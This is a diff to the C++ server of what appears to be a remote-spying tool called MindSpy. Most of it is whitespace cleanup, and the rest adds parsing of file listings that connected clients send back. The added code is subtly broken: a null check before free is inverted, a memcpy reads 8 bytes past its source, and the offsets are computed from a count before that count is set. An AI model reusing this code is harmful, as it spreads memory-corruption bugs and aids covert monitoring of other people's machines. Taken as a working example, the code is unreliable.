@@ -21,7 +21,7 @@ namespace MindSpy
 	}
 
 	bool Servidor::Listo() {
-		return resultado==1;
+		return resultado == 1;
 	}
 
 	void Servidor::IniciarEscucha() {
@@ -88,7 +88,7 @@ namespace MindSpy
 		// Se mueve el comando a los siguientes 4 bytes
 		*(UINT32*)(DataToSend + 4) = comando;
 		// Se copia la data pasada por parámetro a la memoria reservada
-		if (Data) 
+		if (Data)
 			memcpy(DataToSend + 8, Data, SizeofData + 8);
 		// Se envian los datos
 		bool r = send(Conexiones[res].c_socket, (const char*)DataToSend, SizeofData + 8, 0) != SOCKET_ERROR;
@@ -117,17 +117,17 @@ namespace MindSpy
 			// Verificamos si hay bytes por leer
 			ioctlsocket(Conexiones[MyID].c_socket, FIONREAD, &bDisponibles);
 			// si no los hay, ralentizamos y reiniciamos el ciclo
-			if (!bDisponibles) 
+			if (!bDisponibles)
 			{
 				Sleep(50);
 				continue;
 			}
-			else 
+			else
 			{
-				if (!szBuff) 
+				if (!szBuff)
 					free(szBuff);
 				szBuff = (char*)malloc(bDisponibles);
-					
+
 			}
 			// Si los hay, los leemos
 			resp = recv(Conexiones[MyID].c_socket, szBuff, bDisponibles, 0);
@@ -136,7 +136,7 @@ namespace MindSpy
 			else if (resp < 0)
 				break;
 
-			UINT32 comando = *(UINT32*)(szBuff+sizeof(UINT32));
+			UINT32 comando = *(UINT32*)(szBuff + sizeof(UINT32));
 
 			switch (comando)
 			{
@@ -163,10 +163,29 @@ namespace MindSpy
 
 			case CLNT_CMDS::FILEINFO: {
 				stListaArchivos stla;
-				BYTE *ReceivedData = (BYTE*)(szBuff+8);
+				BYTE *ReceivedData = (BYTE*)(szBuff + 8);
 				UINT32 SizeOfReceivedData = *(UINT32*)(szBuff);
-				wcout << L"Data recibida: " << SizeOfReceivedData << endl;
 
+				int OffsetWchar = sizeof(WCHAR)*MAX_PATH*stla.CantArchivos;
+				int OffsetFiletime = sizeof(FILETIME) * stla.CantArchivos;
+
+				stla.CantArchivos = *(UINT32*)ReceivedData;
+				stla.Archivos = (PWCHAR)(ReceivedData + sizeof(UINT32));
+				stla.FechasCreacion = (PFILETIME)(ReceivedData + sizeof(UINT32) + OffsetWchar);
+				stla.FechasModificacion = (PFILETIME)(ReceivedData + sizeof(UINT32) + OffsetWchar + OffsetFiletime);
+				stla.Tamaños = (PLONGLONG)(ReceivedData + sizeof(UINT32) + OffsetWchar + OffsetFiletime * 2);
+
+				Conexiones[MyID].archivos.clear();
+				wcout << L"Data recibida: " << SizeOfReceivedData << endl;
+				for (int i = 0; i < stla.CantArchivos; i++)
+				{
+					Conexiones[MyID].archivos.push_back(Archivo());
+					Conexiones[MyID].archivos[i].nombre = (wchar_t*)&stla.Archivos[getID(i)];
+					Conexiones[MyID].archivos[i].FechaCreacion = stla.FechasCreacion[i];
+					Conexiones[MyID].archivos[i].FechaModificacion = stla.FechasModificacion[i];
+					Conexiones[MyID].archivos[i].Tamaño = stla.Tamaños[i];
+				}
+				break;
 			}
 
 			}
